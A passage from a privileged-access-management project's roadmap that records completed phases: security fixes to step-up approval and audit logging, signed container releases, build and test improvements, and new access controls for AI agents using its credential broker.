  entry whose `PauseID` differs and reports it distinctly (`stepUpClaimStale`),
  so a stale message is told apart from "not hosted here". The local API path
  passes 0 and is unchanged — no message crosses a bus, so what is pending now
  is what the supervisor is looking at
- [x] **Refused replays are logged, not audited.** The payload is readable to
  anything with a database session, so a row per arrival would let a flood
  amplify into the audit trail the retention worker refuses to prune with the
  chain on — the lesson of the unauthenticated-input finding. The refusal is the
  control; the log line is the evidence
- [x] **Test**: `session.TestStepUpBusDecisionCannotBeReplayedOntoTheNextPause`
  taps the decision channel exactly as a database session can, captures a genuine
  approval, and replays it verbatim onto the session's next pause — which must
  stay pending, stay decidable, and leave exactly one `session.stepup_decided` in
  the trail. **Verified to fail against the pre-fix code**, where the replay
  released the second statement
- [x] **Wire-format change, fail-closed in a mixed fleet**: a 0.10.x replica and
  a 0.11.0 replica cannot authenticate each other's cross-replica decisions. A
  decision is refused, never misapplied, and a supervisor can still decide on the
  replica hosting the session; roll all replicas to finish

### 62b — The released image is the code that is released

`v0.10.0` was tagged 2026-07-28 and every Kubernetes, Helm and Terraform
manifest has pinned it since. The 2026-07-30 sweep's fixes landed over the two
days **after** it — ten commits, including the tunnel-scoped viewer token that
authenticated at all three session proxies (reproduced *opening a session*), the
unauthenticated live and kill buses, three paths to a credential that skipped
their siblings' gates, and five paths that acted before or without recording it.
So for a week the documented way to deploy pamv1 produced a build the repo
itself documents as fixed. This is finding 18's shape again — a pin is only as
good as what it points at — and it quietly undid the fourth beta criterion,
because "deploys as code" had come to mean "deploys the pre-fix code".

- [x] **`v0.11.0`**, carrying phases 53–62 and the ten fixes, cut through the
  same test-gated pipeline (digest build, SPDX SBOM attestation, cosign keyless
  signature, SLSA provenance). Published 2026-08-07 as
  `ghcr.io/morandeirachema/pamv1:0.11.0`, digest
  `sha256:04422b7c80b3ed56691fb46196fd4b921dc18a240140184ea9ab24feacdf4b6c`,
  public — anonymous pull verified, the same check that closed finding 18
- [x] **Every pin moved together** — `deploy/k8s/deployment.yaml`,
  `deploy/k8s/conjur/deployment.yaml`, `deploy/terraform/variables.tf`, and the
  Helm chart's `appVersion` (chart `0.2.0`) — so no flavor is left behind, which
  is how the drift started
- [x] **CHANGELOG `[Unreleased]` promoted** to `[0.11.0]`, with the upgrade note
  for the bus wire-format change, and both READMEs state the current release
  rather than the first one

## Phase 63 — Close the rest of the 2026-08-07 sweep ✅

The six findings Phase 62 left. None is a bypass; four are a control or a bound
that did not do what its own comments said, and two are drift in the documents
other tools are built against.

- [x] **A refused step-up decision leaves no record saying it was decided**
  (AO). `decideStepUp` wrote the fail-closed `session.stepup_decided` *before*
  calling `DecideBy`, so both ordinary refusals left a record asserting the
  opposite of what happened — a refused self-approval recorded the **paused
  operator** as having decided their own statement, which is exactly what the
  refusal exists to prevent, and any approver could spray decisions for sessions
  paused nowhere into the chained trail the retention worker will not prune. New
  read-only `StepUp.Holder`, and `DecideRemote` splits into `LookupRemote` +
  `DispatchRemote`, so the handler establishes that a decision will be attempted
  — and that this decider may make it — before it writes anything. The pre-audit
  itself stays: a released statement must not outlive the evidence of who
  released it. The look is advisory, so `DecideBy` still enforces self-approval
  under the lock and a pause that times out in between now answers **409**
  rather than a misleading 404. Test verified against the pre-fix handler,
  restored from git rather than simulated: it wrote 2 phantom records.
- [x] **`session.playback` fails closed** (AP). It was the one read of
  KEK-protected material that did not — and since Phase 59 it also serves
  reconstructed SFTP file content, so it can hand over a secret outright. An
  audit outage made the whole recording archive readable with no record of who
  read it. Now `mustAudit`, before a byte leaves.
- [x] **The SFTP handle table is bounded** (AR). `trackOpen` now refuses an OPEN
  once `sftpCaptureMaxOpen` handles are tracked, and `bindHandle` counts open
  artifacts instead of rescanning the table. The hole: `seq` — the per-session
  artifact bound — only advances when an artifact is created, and creation stops
  at the open-artifact cap, so past that point every OPEN added a permanent entry
  no bound covered while the bind path went quadratic under the mutex both SFTP
  legs need. A real sftp-server self-limits at its descriptor ceiling; a
  compromised target answering every OPEN with a fresh handle does not. Refusing
  on the request leg means no data ever moves against an untracked handle.
- [x] **`sftpCapture.required` is gone** (AQ). It was assigned from
  `PAM_REQUIRE_RECORDING` and never read, while three comments described it as
  the switch making an unwritable artifact refuse the transfer. The code is
  stricter than that — `broken` is sticky and refuses in every mode — so the
  comments were the defect. The flag still governs the session recording itself.
- [x] **Audit vocabulary matches the code again** (AS). `breakglass.unseal_failed`
  and `session.relay_start` are documented; `proxy.auth_rate_limited` is removed
  from §5 **and from the OCSF classifier**, where it had been a Detection Finding
  rule that could never fire since Phase 52e stopped appending it.
  `breakglass.unseal_failed` takes its place there — it was emitted and
  classified nowhere.
- [x] **The reference env file documents token exchange** (AU).
  `PAM_BROKER_TOKEN_EXCHANGE`, `PAM_BROKER_TOKEN_SIGN_SEED` and
  `PAM_BROKER_EXCHANGE_TTL_MIN`, in their own block noting they need the SVID
  block above them. **Half of this finding was withdrawn**: §4 of the low-level
  doc does *not* omit ~34 variables — it documents families in a slash shorthand
  (`` `PAM_LDAP_BIND_DN` / `_BIND_PASSWORD` ``) that the check did not expand.
  Expanding it first gives zero missing of the 158 the code reads. A drift check
  that does not understand the document's own notation manufactures drift.

## Phase 64 — The container build ✅

No runtime code change; five defects in how the images are produced, four of
them invisible because nothing built the second image at all.

- [x] **BuildKit cache mounts** on the module cache and the Go build cache in
  both Dockerfiles (`sharing=locked`, and a separate build-cache id for the
  cgo-enabled PKCS#11 build so its objects never mix with the static one's). The
  layer cache only helps when nothing above it changed, and the layer in question
  is the one whose input *is* the source — so every build recompiled the standard
  library and every dependency from cold. **Correction (65b):** this phase also
  put `cache-from`/`cache-to: type=gha` on the release build, which broke the
  v0.11.1 tag outright (`type=gha` needs the docker-container driver; the job uses
  buildx's default `docker` driver, which cannot export cache). It is removed
  rather than repaired — a release is the one build whose speed matters least and
  whose provenance matters most, and with no backend attached the Dockerfile's
  mounts simply start empty there, so the release builds cold by construction.
- [x] **`Dockerfile.pkcs11` accepts `VERSION`/`COMMIT`.** It never had, so the
  one deployment flavour used with an HSM — the most security-sensitive of them —
  reported `pam-server dev (none)` from `-version`, from its startup log and from
  the `pam_build_info` metric. There is no published PKCS#11 image, so the admin
  guide now shows the build with the arguments passed.
- [x] **Base images pinned by digest**, not only by tag. `golang:1.26-alpine` is
  a different image next week, so two builds of one commit produced different
  binaries and neither the SBOM nor the SLSA provenance described what the other
  shipped. Dependabot already watches `/deploy/docker` weekly, so the pin is
  maintained rather than frozen — the same bargain the deployment manifests make
  with the pamv1 tag itself.
- [x] **`EXPOSE` names every listener**: the PostgreSQL (15) and SQL Server (53)
  proxy ports had never been added. It is documentation, not enforcement, so an
  incomplete list is a reader concluding a proxy does not exist.
- [x] **CI builds both images**, with `DOCKER_BUILDKIT=1` set explicitly rather
  than assumed (the classic builder rejects `RUN --mount` outright). The PKCS#11
  image had no build coverage at all, which is why its missing build args went
  unnoticed for six phases.

Deliberately not changed: `COPY . .` stays. A linter flags it, but `.dockerignore`
already keeps secrets, VCS history and local artifacts out of the context, and
splitting the copy to improve layer reuse would only pay off for changes that do
not touch Go source — which is not what a build of this repo usually is.
Multi-arch (`TARGETOS`/`TARGETARCH` + a buildx platform matrix) is a real gap but
a deliberate one: nothing has asked for arm64, and building it under emulation
would cost more release time than it currently buys.

## Phase 75a — v0.14.1 ✅

A **patch**: the five audit improvements are tests, CI and internal refactors —
no feature, no schema, no environment variable, no audit-vocabulary change.

- [x] **v0.14.1** through the test-gated pipeline, rehearsed first on `main`.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.14.1`, digest
  `sha256:ad19e07c485f1e1b1357d4c509b432125483b8cb7c4aa916d9ce1611e786ab48`,
  public — anonymous pull verified
- [x] **All four pins move together** (both k8s deployments, terraform, Helm
  `appVersion` + chart `0.5.1`), both READMEs restate the current release, and
  every release link passes the label/URL agreement check
- [x] **The one operator-visible change is called out**: long values in console
  tables now truncate with an ellipsis rather than pushing later columns off the
  terminal. It is an improvement, but it is a visible one
- [x] **The README's release list stopped growing a line per release.** It had
  become a chain of "and vX and vY and vZ"; it now names the newest and points at
  the changelog

## Phase 75 — What of `internal/api` actually wanted to move ✅

The last improvement from the 2026-08-08 audit, and the one whose honest answer
was *mostly no*. The audit flagged `internal/api` at 26% of the tree with a
63-field `Server`, and `run()` at 815 lines. Both numbers are real; the
conclusion they suggest is not.

**The measurement came first, and it changed the plan.** Counting what each
extraction candidate actually touches:

| file | distinct `Server` members used |
|---|---|
| `scheduler.go` | **16**, including handler methods (`rotateCredential`, `snapshotAccess`, `spawnDueCampaigns`, `sendCampaignReminders`) |
| `archive.go` / `retention.go` | 7 each, plus each other's methods |
| `clipboard.go` | **0** |

Moving the background workers out would mean passing sixteen things, most of them
handler behaviour — the god-object rebuilt under a new name, which is worse than
leaving it. The same holds for `run()`: forty locals feed one 65-field `Options`
literal, so extracting the construction half returns the same forty renamed.
**The package is large because the domain is, and the coupling is real rather
than accidental.** That is the finding.

Two things genuinely wanted to move, and did:

- [x] **Clipboard observation moved to `internal/guacd`.** It is Guacamole
  protocol knowledge — reconstructing a transfer from `clipboard`/`blob`/`end`
  opcodes — with **zero** coupling to `Server`, sitting in the HTTP package while
  the package that owns the protocol sat next door. `internal/guacd` is now the
  single place that knows the wire format
- [x] **`serveAndShutDown` split out of `run()`** (815 → 750 lines). It is the
  one genuinely separable part: it takes what it needs and nothing else. The three
  copy-pasted proxy-drain `select` blocks became **a slice** — that was the shape
  that loses a listener the day a fourth is added, which is the same hazard
  Phase 74 just wrote a test for on the database proxies. Covered by the existing
  `TestRunServesAndShutsDownGracefully` and `TestRunServesTLS`

Deliberately **not** done, with the reason recorded rather than left implicit:
splitting the workers, archive/retention, or the construction half of `run()`.
The right long-term move is to shrink `api.Options` (67 fields) into grouped
sub-structs, which is a design decision worth taking on its own rather than as a
side effect of a size metric.

**All five audit improvements are now closed** (71 console, 72 store roles,
73 coverage, 74 proxy parity, 75 this).

## Phase 74 — Policy parity between the database proxies, and a test that does not bet on the scheduler ✅

Two of the three small items from the 2026-08-08 audit. (The third — `run()` at
815 lines — belongs with the `internal/api` work, since it is what builds that
package's 63-field `Server`, and is deferred to it.)

- [x] **The two database proxies are held to the same gate set.** They are ~1,000
  lines each and deliberately line-for-line siblings, so that *anything differing
  between them is the transport and never the policy*. That is a good decision
  and a fragile one: every policy fix must be made twice, and nothing but care
  stopped the second being forgotten. `TestDBProxiesEnforceTheSameGates` names
  the fourteen identifiers that constitute policy — authorization, the
  identity-time refusals, the abuse limits, recording and in-session control, and
  the fail-closed audit before the upstream dial — and fails if either file
  references one the other does not. **Verified by simulating the drift**: with
  the tunnel-only-token refusal deleted from the SQL Server path — which compiles
  cleanly and passes every other test — it fails with `policy drift: dbproxy.go
  references "TunnelOnly" and mssqlproxy.go does not`. That is the exact shape of
  a real 2026-07-30 finding
- [x] **A gate that matches neither file fails too**, so the list cannot rot into
  a set of dead names quietly checking nothing. Comments are stripped before
  matching, so a gate merely *mentioned* in prose cannot stand in for one that is
  enforced
- [x] **The two sleep-then-assert tests are gone.** Most of the repo's sleeps sit
  inside polling loops, which is the right pattern; two in the step-up API tests
  were fixed 50 ms bets that a goroutine would be scheduled in time — true on an
  idle laptop, a coin toss on a loaded runner. They now poll to a deadline, which
  is the same test without the bet

## Phase 73 — The coverage number stops understating itself ✅

The fourth improvement from the 2026-08-08 audit, and the smallest change with
the clearest payoff: a metric you would otherwise make decisions on was wrong by
about four points, in the misleading direction.

The `test` job measures with `-coverpkg=./...` and has **no database**, so
`internal/store/pgstore`'s ~900 statements are counted as ~0 — while the
`pgstore` job actually exercises them and its coverage was reported **nowhere**.
The published figure was therefore depressed by a package this repo tests
deliberately elsewhere, and the package that job covers looked untested in every
report.

- [x] **Three numbers instead of one**: the total as measured, the total
  excluding pgstore (**77.5%**, what that job really exercises), and pgstore
  alone (2.7% there, because it cannot run) — each labelled with why it differs
- [x] **All three from `go tool cover`** on filtered copies of the same profile,
  so they are one measurement and cannot disagree by method. An earlier attempt
  computed the split with awk and landed 0.2 points off the tool; two totals
  produced two different ways is exactly the confusion this phase exists to end
- [x] **The pgstore job reports its own coverage**, from the one place with a
  database — so the half the `test` job cannot see is finally printed
- [x] **Still printed, not gated.** A threshold picked today would be arbitrary;
  the change is to what the number *means*, not to what it blocks

This codebase has been bitten by a coverage-measurement artifact before —
per-package accounting once made `internal/broker` read as 35% when it was 85%,
and sent a review after the wrong problem. This is the same class one layer up,
and the comment in `ci.yml` says so, so it is not rediscovered a third time.

## Phase 72 — Store composed from role interfaces ✅

The second improvement from the 2026-08-08 audit. `store.Store` was one flat
interface and **the main tax on every change**: a feature edits the interface and
both implementations, which is a bill paid three times in phases 68–70 alone.

- [x] **Composed from 19 role interfaces**, one per domain — `TargetStore`,
  `CredentialStore`, `GrantStore`, `CertificationStore`, `ApprovalStore`,
  `CheckoutStore`, `AuditStore`, `UserStore`, `LoginSessionStore`, `MFAStore`,
  `BrokerStore`, `BrokerAuditStore`, `AppSecretStore`, `VendorStore`,
  `SSHCertStore`, `KeyMaterialStore`, `SettingStore`, `SessionBusStore`,
  `SystemStore`. `Store` embeds all of them, so both implementations and every
  caller are untouched
- [x] **Cut mechanically, not retyped.** The interface was already separated into
  blank-line groups by domain; a script mapped groups to roles and moved the text
  verbatim, so no signature or doc comment could be altered in transcription
- [x] **The method set is asserted, not assumed.** `TestStoreMethodSetIsUnchanged`
  reflects over the composed interface and pins the count. It also settles a
  discrepancy: the surface is **149** methods, not the 137 you get by counting
  declarations, because it has always also carried `session.LiveStore` and
  `session.StepUpStore` — a gap between *what the file lists* and *what the
  interface is* that is itself the argument for naming the roles. Verified by
  running the same assertion against the pre-refactor file: 149 before, 149 after
- [x] **Two consumers narrowed, to show the payoff rather than assert it.**
  `auditchain.New` took all 149 methods and used **three**; it now takes
  `store.BrokerAuditStore`. And `maint.RotateVaultKEK` takes a named
  `VaultRotationStore` listing the **four kinds** of KEK-wrapped value it must
  re-wrap — because the bug that function shipped once was *omission*, and the
  exhaustive set now sits in the signature where a reviewer reads it instead of
  having to be reconstructed from the body

Deliberately **not** done: narrowing all 129 handlers. `api.Server` holds one
store and uses most of it; rewriting every signature would be a large diff for
little gain. The value is that a *new* consumer can now state its 3 methods, and
two did.

## Phase 188 — v0.51.0 ✅

Releases Phase 187 alone: the three console screens for capabilities that had
shipped with an API and no portal path, and the guard that will notice the next
one. A deliberately small release — **no schema change, no new env var, no new
route and no upgrade note** — cut rather than banked, because the whole point of
the phase is that a gap sat unnoticed for three phases and banking it would be
the same mistake in miniature.

- [x] **v0.51.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-21 as `ghcr.io/morandeirachema/pamv1:0.51.0` (also
  `latest`), digest
  `sha256:323f3cd0c3576ec874800d757ec298079ccd0109a47d9f862ad6dfb9219fb0ed`,
  **public** (anonymous pull 200 on both tags, both resolving to the same
  digest), with the `pam-agent` binaries (amd64 + arm64), the SPDX SBOM and
  `SHA256SUMS` attached — the second release in one day, which is what a small
  phase cut promptly rather than banked looks like
- [x] All five pins via the sweep; Helm chart `version` 0.41.0 -> **0.42.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` and
  ROADMAP.md's top-banner phase count
- [x] `CHANGELOG.md` gains the release entry, whose **Fixed** line is the parity
  claim itself: it is now enforced by a test rather than asserted by a sentence
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging

## Phase 187 — Three capabilities the portal could not reach ✅

A parity sweep, asked as a diff: the generated route table against the console's
own `api()` calls, which operator-guarded routes does no screen touch?

**Three, and all of them shipped that way.** DoubleLock (Phase 135), SCIM client
keys (149) and the browser-extension token (147) had routes, an admin-guide curl
command, and **no screen at all** — capabilities an operator could only use by
leaving the product, while the README and this roadmap both claim every shipped
capability is operable from the portal. Console parity was last asserted by hand
in Phase 45; three phases shipped past it, and nothing checked.

- [x] **DoubleLock is credential option `10`.** Off is immediate — the lock is
  being removed and the reveal gate already proved this caller may hold the
  secret — while on collects the holder and password on `PAMDBLLCK`. The
  credential listing gains a DoubleLock column, so the state is visible before
  somebody wonders why a reveal is asking for a second password
- [x] **Menu 29 manages SCIM client keys** (`PAMSCIMKY` / `PAMADDSCM` /
  `PAMSCMTOK`), with the token shown once, exactly as an agent key is
- [x] **Menu 30 mints a browser-extension token** (`PAMEXTTOK`), which the admin
  guide had been documenting as a curl command — a strange thing to ask of the
  person whose browser it is for
- [x] **The durable half**: `web.TestConsoleCanReachEveryOperatorRoute`. Every
  route behind an operator capability must be called by the console or listed in
  `notOperable` **with the reason** a person is not expected to use it — 37
  entries, every one a browser-driven flow, a list loader or a client-side
  protocol. The exception list is the point: skipping a screen becomes a decision
  somebody wrote down rather than an omission nobody noticed
- [x] **The guard's own first draft was wrong, and that is recorded too.** It
  matched on the static path prefix and passed while DoubleLock was still
  missing, because `/api/credentials/{id}/doublelock` shares its prefix with half
  the credential screen. The matcher now requires every literal segment in order
  — which is exactly what distinguishes a sub-resource nobody calls from the
  parent everybody does — and fails on all six routes when the screens are
  removed
- [x] Console fixtures for all three screens, including the extension screen's
  before and after states
- [x] No schema change, no new env var, no new route

## Phase 186 — v0.50.0 ✅

Releases phases 179–185: the research backlog's last capability items (posture
on the agent path, `may_act` issued, the approver's view of a delegation) and
**three phases of auditing the batch itself**, which is where most of this
release's value sits — a flag that was wrong in the reassuring direction, three
knobs that gated nothing, and seven refusals no detection surface could see.

**No schema change** (high-water stays `0046`), one new env var, and **three
upgrade notes** — the first of which can stop a deployment from starting, which
is the point of it.

- [x] **v0.50.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-21 as `ghcr.io/morandeirachema/pamv1:0.50.0` (also
  `latest`), digest
  `sha256:ce4a81fff9d80d0f8ac3c78547fb56c1521f8c69b653762dc078eb4b5071af50`,
  **public** (anonymous pull 200 on both tags via the GHCR token-exchange flow,
  both resolving to the same digest), with the `pam-agent` binaries (amd64 +
  arm64), the SPDX SBOM and `SHA256SUMS` attached. The release job took 3m45s,
  the fastest of the batch — Phase 185's iteration-bounded fuzz gate is part of
  why
- [x] All five pins via the sweep; Helm chart `version` 0.40.0 -> **0.41.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` and
  ROADMAP.md's top-banner phase count
- [x] `CHANGELOG.md` gains the release entry. Its **Fixed** section is longer
  than its **Added** section for the first time, and that is an honest summary of
  the release rather than an accident of ordering: three of the seven phases
  exist because the batch audited itself and did not like what it found
- [x] The three upgrade notes are written where an operator meets the
  consequence: a startup that now refuses an inert setting, risk scores that rise
  because behaviour which scored zero now counts, and a SIEM that starts
  receiving findings it did not before
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging: `gofmt`,
  `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race ./...`,
  `go run ./cmd/archgen`

## Phase 185 — The refusals no detection surface could see ✅

Asked of the last ten phases: **what did any of them add to the two detection
surfaces?** Nothing. Five phases had added refusals, and `internal/ocsf`'s
finding map and `internal/analytics`' `command_blocked` set had not changed
since Phase 161.

- [x] **Three from this batch.** `agent.not_enrolled` (174) and
  `broker.approval.four_eyes_unverified` (176) reached neither surface —
  `_refused` and `not_` are not suffix rules, and nobody added the exact entry —
  while `agent.posture_denied` (180) exported correctly via the `_denied` suffix
  and still scored **zero** in the risk engine
- [x] **`four_eyes_unverified` is classified but deliberately not counted.** It
  is not a refusal: the approval went through, and the row records that the
  second pair of eyes could not be established. That belongs in a SIEM — a
  control that silently could not run — and not in a signal permitted to drive an
  automated response, where it would inflate a count of things that were blocked
  with one that was not
- [x] **Then the guard found five more, none of them new.**
  `broker.token.refused` (57), `forward.refused` (141) — the SSRF pivot that gate
  exists to stop — `k8s.refused` (155), `winrm.refused` (16/38) and
  `sftp.blocked` (32/92) had been exporting as **routine API Activity** since the
  phases that introduced them. Every one is a refusal of an already-authenticated
  party, which is exactly what `command.blocked` has been classified as since
  Phase 27
- [x] **The durable half**: `ocsf.TestRefusalShapedActionsAreClassified`, the
  inverse of Phase 161's `TestFindingExactActionsAreEmittable`. That one catches a
  classification no code can emit — coverage advertised and absent. This one
  catches an action pamv1 really emits, named the way pamv1 names a refusal, that
  no classification reaches. Narrow on purpose: not "every action must be
  classified", but "an action whose NAME says something was refused must either
  be a finding or be listed with the reason it is not". One entry so far —
  `dependency.create_denied`, input validation on an admin's own request
- [x] **Operator-visible consequence, stated rather than discovered**: risk
  scores rise where these refusals are routine, because behaviour that was
  invisible to the engine now counts. That is the intent — an operator repeatedly
  refused a port-forward is precisely what the signal is for — but it is worth
  knowing before `PAM_ANALYTICS_AUTO_KILL` acts on it
- [x] Tests: `analytics.TestAgentAdmissionRefusalsScoreAsBlocked` and the new
  coverage guard, which **failed on its first run** with the five older gaps
- [x] **A CI-gate repair that rode along**, and the same shape as the finding:
  the fuzz smoke step budgeted `-fuzztime 20s` per target, so a loaded runner
  failed the build with `context deadline exceeded` on a commit that had touched
  no parser — the engine unable to finish inside its own deadline. That is a test
  being impatient, not a defect being found, and it is the second time in this
  batch a job failed for reasons unrelated to its diff (ROADMAP §3d is the
  first). The budget is now a **count** (`-fuzztime 3000x`): the same work on
  every machine, and nothing to expire
- [x] No schema change, no new env var, no new route

## Phase 184 — Documentation sync across the set ✅

A currency pass over every `.md` in the repo, run because the previous one
(Phase 176's docs half) fixed the headers and the two architecture docs — and
five other documents kept saying "161–173" in their bodies while their
`Reflects:` line said 183. **A header that is current above a body that is not
is worse than a stale header**, which at least tells you to check.

- [x] **Five bodies caught up**: `PORTS-AND-FLOWS.md` (extended through 183, and
  it now names Phase 180's posture check as the one agent-path change that dials
  out at all — to the webhook already used for human operators, flow E15, not a
  new egress), `OT-DEPLOYMENT.md`, `RDP-TESTING.md`, `VNC-TESTING.md`,
  `REQUIREMENTS.md` and `SYSADMIN-GUIDE.md`
- [x] **Two counts were wrong, not just old**: the batch's knobs are five, not
  three (`MAX_RESULT_BYTES`, `BUDGET_PER_DAY`, `REQUIRE_ENROLLED_SVID`,
  `REQUIRE_KNOWN_OWNER`, `POSTURE_REQUIRED`) and its migrations three, not two.
  A sentence assembled by three successive edits had also collapsed into
  ungrammar, which is what happens when a passage is patched instead of rewritten
- [x] **Both READMEs said the roadmap runs 0–178.** They are the first thing a
  reader sees and the last thing a phase remembers
- [x] **`SECURITY-GAPS.md` gained the 2026-08-19/21 self-sweeps** — findings CN
  through CP, one of them a defect a single phase old — and states the process
  conclusion plainly: a per-phase review cannot catch a defect whose author
  believed the phase was correct, so both live findings came from reading the
  batch as a whole with scans that do not care what any phase intended
- [x] **`NIS2-COMPLIANCE.md`** absorbed 179–183 into its control-mapping note (a
  new `agent.*` name counted by prefix, a claim written into a token whose
  issuance was already recorded, a new FIELD on an action already counted, and
  configuration validation that emits nothing but removes three ways a deployment
  could believe it was gated), and **`CODE-GUIDE.md`** gained the agent-admission
  order — cheapest and most local first, posture last because it is the only
  check that leaves the process — plus what a verified `Identity` now carries
- [x] **Checked and correct as they stand**: `ARCHITECTURE-DIAGRAMS.md` is
  code-generated and CI-diffed; `RELATED-PROJECTS.md` deliberately tracks the
  outside world rather than phases; every remaining "159–173"-style string is a
  change-log entry describing its own scope, which is history, not drift
- [x] Docs-only: no code, no schema, no route, no env var

## Phase 183 — The approver sees the chain, the trail joins the token ✅

**Closes:** the agent-broker research pass's finding 6 — the last of the batch's
presentational gaps, and the kind that is easy to leave undone because nothing
is broken, only unanswerable.

- [x] **`PendingApproval` carries `ActorChain`.** The queue named the calling
  agent and its accountable party, so a direct call and one that arrived down a
  chain of sub-agents looked **identical** to the human approving it — while the
  chain had been written to the hash-chained trail since Phase 57. It never
  reached the person being asked to decide
- [x] **Console menu 20 gains a HOPS column**: `direct` for an undelegated call
  (a one-element chain is an agent acting for itself, so depth counts hops, not
  links), the count otherwise, with the chain in the hover title so a deep
  delegation cannot push the row's later columns off a 5250 screen — the defect
  Phase 175 found on the campaign screen, not repeated here
- [x] **The presented token's `jti` is parsed** into `Identity.TokenID` and
  recorded on every brokered call as `svid_jti:`. `broker.token.exchanged` has
  carried the MINTED token's `jti` since Phase 161, so both halves of a
  delegation were on the trail with nothing linking them: an investigator could
  see a token issued and calls arriving, and could not prove they were the same
  token
- [x] **Named `svid_jti`, not `jti`**, because a brokered call's `jti:` already
  means the resume token's id. One call can carry both, and an investigator must
  not have to guess which identifier they are reading
- [x] **Bounded at the verifier** (64 characters): a `jti` is an issuer-chosen
  opaque string that now reaches the audit trail, and an unbounded one is a way
  to flood it. Truncated rather than dropped — a truncated id still joins a mint
  to its uses, a dropped one loses the link entirely. Recorded, never trusted for
  a decision
- [x] Test: `api.TestDelegatedCallJoinsItsMintAndShowsItsChain` — the queue
  carries the chain, and the exchange row's `jti` equals the call row's
  `svid_jti`. **Verified to FAIL against the pre-183 queue**, which named the
  agent and nothing about its lineage
- [x] No schema change, no new env var, no new route

## Phase 182 — Knobs that did nothing where they were set ✅

A sweep over what phases 174–181 **shipped** rather than over their code: the
env vars, the deploy examples, the in-memory state. Three findings, and all
three are this batch's recurring failure class one level up — not a dead field
in the code, but a **live field in the configuration whose prerequisite is
absent**.

- [x] **Three refusals that could never fire.**
  `PAM_BROKER_REQUIRE_ENROLLED_SVID` without `PAM_BROKER_TRUST_DOMAIN_JWKS`
  gates an authentication path that does not exist; `PAM_BROKER_POSTURE_REQUIRED`
  without `PAM_POSTURE_ATTEST_URL` asks a webhook nobody configured; any of the
  three broker refusals with no `PAM_BROKER_POLICY_FILE` gates a broker that is
  off. Each reads to an operator as "the agents are gated" and did nothing at
  all. Each now fails the startup loudly — the idiom the validator already used
  for `PAM_BROKER_TOKEN_EXCHANGE`, applied to the knobs that arrived after it
- [x] **Checked as a group**, so the next broker refusal is covered by adding a
  line to a list rather than by remembering to write a new `if`
- [x] **The same three were missing from both shipped deploy examples.** An
  operator copying `deploy/docker/.env.example` or
  `deploy/k8s/configmap.example.yaml` never learned they exist — the drift Phase
  63 fixed once for Phase 57's variables, recurring for mine. Added, each with
  the ordering advice it needs: let the inventory build itself and claim what you
  recognise *before* requiring enrollment; teach the posture webhook about agent
  names *before* asking it about them
- [x] **A bound on Phase 176's own damper.** `svidSeen` held one entry per
  distinct SPIFFE ID for the life of the process — small in a stable trust
  domain, unbounded in one that mints a per-pod identity. Capped at 4096 with a
  whole-map drop past it: the entries are interchangeable, the worst case is one
  extra row write per identity while the damper re-learns, and an LRU would be
  more machinery than the thing it protects
- [x] **Also checked, clean**: MCP SSE sessions are deleted on close, not
  accumulated; the numeric broker caps are harmless when the broker is off (a cap
  that bounds nothing misleads nobody, unlike a refusal that cannot happen); and
  every route added since 169 is guarded by `CapManageUsers` or the agent
  authenticator, as `archgen`'s route table shows
- [x] Test: `config.TestInertBrokerKnobsFailStartup` — each inert combination
  refused by name, and the fully-configured deployment still loading, so the
  check refuses an inert setting rather than the feature
- [x] No schema change, no new env var, no new route

## Phase 181 — `may_act` is issued, not only enforced ✅

**Closes:** the agent-broker research pass's finding 5.

**The asymmetry.** `exchange.go` has refused since Phase 57 to mint for an actor
the delegating token's RFC 8693 §4.4 `may_act` does not name — and has never
emitted the claim. So the check was real, and beyond the first hop it had
nothing to read: every token pamv1 minted was unpinned, and "who may act for
this identity" was a question the system asked and never answered.

- [x] **`POST /v1/token` accepts `may_act`** — repeated, or space/comma-separated
  — and stamps it into the issued token in the RFC's own `{"sub": …}` shape: a
  bare string for one party, a list for several, which is exactly what this
  package's verifier already accepts on the reading side. Emission and
  enforcement now meet, which is the only state in which either is worth
  anything
- [x] **Documented as a pamv1 EXTENSION, not passed off as standard.** RFC 8693
  defines `may_act` as a claim and defines no request parameter for it, so no
  other implementation will accept the same request. Said in the code, the admin
  guide and the protocols doc
- [x] **Narrowing rules, all fail-closed**: at most eight parties (a pin naming
  everybody is not a pin, and an unbounded list is an unbounded token), every
  entry inside the trust domain (a token vouching for a foreign party is either a
  mistake or an attempt to make pamv1's own enforcement read as though somebody
  outside had been approved), and never the token's own subject — an identity
  does not need permission to act as itself, and allowing it would let a caller
  satisfy a later check with a self-reference
- [x] **The trust domain comes from the actor's already-verified SPIFFE ID**, not
  from a second config field, so the rule cannot drift away from the verifier's
- [x] **On the trail**: `broker.token.exchanged … may_act:` names the pin, absent
  when unpinned — so its presence is itself the signal that somebody narrowed the
  token, and an investigator can answer "who was this allowed to be handed to"
  without holding it
- [x] **Unpinned stays the default**, which is what every token minted before
  this phase was: an omitted parameter changes nothing for an existing caller
- [x] Tests: `api.TestMayActPinsTheNextHop` end to end (pinned actor allowed,
  stranger refused with the claim named, pin audited, out-of-domain pin refused)
  — **verified to FAIL with the emission removed**, where the stranger was
  delegated to successfully — plus `agentid.TestValidateMayActBounds` and
  `TestTrustDomainPrefix`
- [x] No schema change, no new env var, no new route

## Phase 180 — Posture reaches the agent path ✅

**Closes:** the agent-broker research pass's finding D.

**The gap.** `internal/posture` has been wired into the session proxies'
`admit()` and the REST `authz` middleware since Phase 133, and into `agentAuth`
never. A human operator's laptop proved its health on every authenticated call
while an AI agent's container reached the broker on a bearer token alone — the
inversion this batch keeps finding, with the least-trusted actor holding the
weakest gate.

- [x] **`PAM_BROKER_POSTURE_REQUIRED`** (default off) extends the existing
  webhook to agent identities. **A separate knob from `PAM_POSTURE_ATTEST_URL`,
  deliberately**: a deployment already attesting laptops has a webhook that has
  never heard of an agent name, and enabling this silently would refuse every
  brokered call the moment it upgraded
- [x] **Checked last among the admission gates.** Quarantine, enrollment and the
  local checks run first, because posture is the only one that leaves the
  process: a stopped identity is refused here and never becomes traffic the
  deployment's EDR system has to absorb. Pinned by its own test
